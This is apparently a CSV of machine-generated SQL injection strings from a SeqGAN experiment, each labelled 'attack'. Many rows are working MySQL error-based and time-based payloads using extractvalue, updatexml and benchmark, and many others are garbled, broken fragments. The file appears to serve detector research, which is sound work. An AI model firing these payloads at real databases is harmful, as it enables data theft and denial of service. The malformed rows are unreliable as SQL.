attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,779
attack,"1%select   )    (  4066  =  extractvalue  (  (  8862,md5  =  (  3393,1   or updatexml  (  (  (  (  (  0x5c,  (  (  (  1808,concat  (  (  0x2e,0x7171706a71,  (  select   (  (  el  (  1297  =  (  7982,concat  (  (  0x2e,0x7171706a71,  (  (  (  9627,m  (  (  select   (  elt  (  1808  =  (  3393  =  (  1   (  extractvalue  (  (    (  7982,1   )    (  extractvalue  9627,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,780
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,781
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'yn ddrese  (  (  elt  (  7982  =  (  (  0x5c,  (  (  benchmark  (  (  5000000(  1808  =  3393,  (  5000000(  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  9255,concat  0x4b774c75   end  (  elt  (  elt  (  (  3393  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  3393  =  (  0x5c,md5  (  (  (  1 as a  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,782
attack,1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,783
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,784
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,785
attack,"1%""   )    (  extractvalue  (  8862,1%,4102  )  (  (  (  (  (  0x5c,0x7171706a71,  (  (  (  (  5000000,md5  (  (  0x2e,concat  (  0x2e,1   )    (  extractvalue  (  select   (   (  (  1812  )   (  8403  (  (  (  0x2e,0x7171706a71,  (  5000000(  7982  (  (  0x2e,0x7171706a71,  (  5000000(  =  (  (  7982  =  (  (  (  select   (  elt  (  3393  =  (  1297,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,786
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,787
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,788
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,789
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,790
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,791
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,792
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,793
attack,"select   (  5740  (  (  0x2e,md5  (  =  (  0x52515a50   (  5198  (  0x5c,0x7171706a71,  (  select   (  elt  (  case  )  =  (  8862,concat  (  (  0x5c,0x7171706a71,1   )    (  extractvalue  (  (  9627,concat  (  (  (  (  0x5c,  (  (  select   (  elt  (  et  (  elt  (  1808  =  0x2e,0x7171706a71,  (  (  =  9627,1   (  case 0 from du d   (  0x2e,  (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,794
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,795
attack,"1%""   )    AND 'i'  =  4102  =  extractvalue  (  (  3393,concat  (  (  (  (  (  (  (  (  0x5c,,md5  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  5000000,(  (  0  (  (  (  0x4b774c75   (  (  )  elt  (  elt  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  select   (  (  elt  (  5000000(  (  2917  =  (  (  3393,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,796
attack,"1%1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,797
attack,1%'  =  'n%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,798
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""M' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '"" like ""kgpkhrr""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,799
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,800
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,801
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,802
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,803
attack,"1%""   )    )     extractvalue  (  9627,concat  (  (  =  (  (  (  1808,1   (  )  '  0x4b774c75 0 from d  (  e  (  3393,1   )    (  (  select 0 from dualne  )  e  )  elt  (  e  (  3393  =  (  0x2e,md5  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  3393  =  (  (  0x5c,  (  t  (  (  5000000(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,804
attack,"1"" and extractvalue  (  (  (  (  7982  =  (  1808,concat  (  =  (  (  (  3393  =  1   from d afrom dual  )   end  (  (  (  eltal  )  )  e  )  0x5c,  (  (  5000000  (  (  5000000,m5  (  (  select   (  e  (  elta   (  4415  (  7982,1   )    AND 'i'  =  1 extractvalue  (  (  (  (  2917  =  (  0x2e,1   )    )     )  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,805
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,806
attack,"1%'   and extractvalueextractvalue  (  (  3393,concatm,0x7171706a71,  (  9627,concat  (  (  3393  (  0x5c,  (  benchmark  (  (  5000000,(  (  (  select   (  case 0   (  us   (  (  elt8375  )  7982  =  (  3393,md5  (  3393,1   from dual  e  =  1272  =  (  (  0x5c,0x7171706a71,  (  select   (  el  (  5000000,md5  (  select   (  elt  (   SELECT dut  (   (  1354",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,807
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,808
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,809
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'AND%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,810
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,811
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,812
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ' bfnc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,813
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,814
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,815
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,816
attack,1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,817
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'q%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,818
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,819
attack,"1%%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pnnkjynhz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,820
attack,"1%'   #"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,821
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,822
attack,"1%E"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,823
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,824
attack,"1%""  =  ""%o      W1161lo_nal  )  =  7982,1   )    AND 3933  concat  (  extractvalue  (  (  0x5c,  (  (  0x5c,  (  (  benchmark  (  (  benchmark  (  5000000(  (  0x2e,md5  (  =  (  (  9788  =  =  3393,  (  5000000(  2917,1   (  8403    (  select   (  select   (  3576  =  (  (  5000000,md5  (  (  0x5c,  (    (  5000000(  (  0x5c,0x7171706a71,  (  (  benchmark  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,825
attack,"1% updatexmld cast  (  1 as do   (  (   (  8375  (  (  elt  (  a  )  (  0x2e,0x7171706a71,  (  (  =  9255,1   )    (  extractvalue  (  (  9255,1   )    (  extractvalue  (  (  (   and,  (  (  select   (  eltal  )  )  1802  (  (  1297  =  (  3393,1   )    (  extractvalue  (  5000000(  (  7982  =  (  3393,1   (  case * from 0 from  (  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,826
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  'kfbboseeoleanal  )  =  1  )  (  (  select extractvalue  (  (  (  (  2917,concat  (  (  =  (  (  3393,1   )    (  extractvalue  (  9255,concat  (  (  0x2e,md5  (  (  0x5c,  (  (  benchmark  (  (  (  9627,  (  benchmark  (  benchmark  (  benchmark  (  5000000(  (  9255,concat  (  (  (  0x2e,(  (  =  (  (  benchmark4415  (  (  (  1808  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,827
attack,"  =1 and extractvalue  (  (  0x2e,0x7171706a71,  (  (  (  (   (  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (  3393,0x717a767a71   (  (  elt  (  elt  (  (  e  (  1 a  (  elt  (  elt  (  9627,concat  (  (  (  select   (  elt  (  3393  =  (  (  3393  (  0x2e,0x7171706a71,  (  (  benchmark  (   (  (  1543  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,828
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,829
attack,"1"" and extractvalue  (  (  (  (  (  benchmark  (  (  5000000(  (  (  (  1808,1   where 4102  =  1559  2162 where extractvalue  (  (  (  9627,concat  (  (  (  =  (  (  (  (  (  (    (  (  (  (  0x5c,0x7171706a71,1  )  (  (  select   (  (  5777  (  3393,1   )    AND 4102  #)  )  w  gxyt  ws",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,830
attack,"1%""   )    AND     )  =  4968  =  1 extractvalue  (  (   (  57042917,(  (  (  0x5c,  (  (  (  (  =  (  9627,concat  (  (  (  select   (  elt  (  e  (  1808  =  (  0x2e,md5  (  0x2e,0x7171706a71,  (  9788  (  benchmark  (  (  0x5c,0x7171706a71(  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  0x4b774c75   (  (  (  elt  e  =  1724  =  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,831
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,832
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,833
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kbn benal  )  )  1808  =  (  (  e  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  4415  =  (  (  (  0x5c,  (  (  benchmark  (  (  0x5c,  (  (  5000000,md5  (  3393  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  6581  =  (  1808,concat  (  (  (  0x5c,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,834
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,835
attack,"1%""   )    AND 'i'  =  1 updatexml  (  (  (  (  (  (  (  (  (  =  (  (  1297,concat  (  (  =  (  (  1808,concat  (  (  select   (  elt  (  1808  =  (  (  0x5c,  (  5000000,m5  (    (  (  select   (  elt  (  elt  (  5000000,md5  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (   (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,836
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'n",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,837
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%"" like ""2051pbn AND pc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,838
attack,"1 or extractvalue  (  (  3393,concat  (  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  2917  =  1    a d5  (  elt  (  elt  (  0x5c,0x7171706a71,  (  (  select   (  (  elt  (  elt  0x4b774c75   end  (  3393,1   )    (  extractvalue  (  9627,1   (  (  casecase when   (  (  (  el  (  1808  =  (  8868  (  (  e  (  0x2e,md5md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,839
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,840
attack,"1%%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,841
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,842
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,843
attack,"1%""   # 'i'  )  1 9083  =  (  (  2162 where 4102  =  1 and updatexml  (  (  (  (  0x2e,(  (  benchmark  (  (  (  2917,concat  (  (  (  (  (  0x2e,concat  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  el_nalte  (  elt  (  0x2e,md5  (  0x2e,0x7171706a71,  (  select   (  elte  (  elt  (  e  (  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,844
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,845
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,846
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,847
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  ""%""  =  ""k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,848
attack,"select   (  3539  (  7982  =  (  3393,  (  (  benchmark  (  (  7982,  (  (  benchmark  (  (  benchmark  (  5000000(  (  0x5c,  (  select   (  elt 0   (  (  elt  elt  (  elt  (  0x5c,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  =  (  0x2e,0x7171706a71,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,849
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,850
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,851
attack,"1%""/  (  (  2917,concat  (  (  (  (  (  0x5c,0x7171706a71,concat  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  (  (  1 as a  elt  (  1808  =  2162 d5  6560  (  (  1759  =  (  5000000,md5  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,852
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""ikpkh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,853
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,854
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,855
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,856
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,857
attack,%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,858
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,859
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,860
attack,"  (  =  (  1049,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  7982  =  (  7982,1   from dual  )  e  )  elt  (  e  =  6528  (  5603  =  (  (  3393,concat  (  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,861
